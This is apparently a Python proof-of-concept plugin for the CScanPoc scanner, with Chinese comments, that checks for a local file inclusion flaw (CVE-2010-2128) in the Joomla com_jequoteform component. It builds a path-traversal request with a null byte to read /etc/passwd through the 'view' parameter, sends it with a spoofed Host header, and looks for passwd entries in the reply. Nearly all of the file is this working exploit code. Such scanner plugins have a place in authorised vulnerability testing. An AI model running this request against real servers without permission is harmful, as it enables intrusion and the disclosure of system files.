# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0038'  # 平台漏洞编号
    name = 'Joomla Component com_jequoteform - Local File Inclusion'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2010-06-01'  # 漏洞公布时间
    desc = '''
        Joomla!的JE Quotation Form (com_jequoteform)组件存在目录遍历漏洞。
		远程攻击者可以借助脚本index.php中的view参数中的".."符读取任意的文件，也可能导致其他未明影响。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2010-4376'
    cnvd_id = 'CNVD-2010-4376'  # cnvd漏洞编号
    cve_id = 'CVE-2010-2128'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '378462fd-149f-4fe5-94bb-4fb94928d742'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 下面以读取/etc/passwd文件的内容为例子验证漏洞
            filename = '/etc/passwd'
            url = '/index.php'
            exploit = '?option=com_jequoteform&view='
            dBs = '../'*5+'..'
            ends = '%00'
            # 测试的URL地址
            vulurl = arg+url+exploit+dBs+filename+ends

            # 伪造的HTTP头
            httphead = {
                'Host': 'www.google.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            resp = requests.get(vulurl, headers=httphead, timeout=50)

            if resp.status_code == 200 and re.match('root:.+?:0:0:.+?:.+?:.+?', resp.text):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
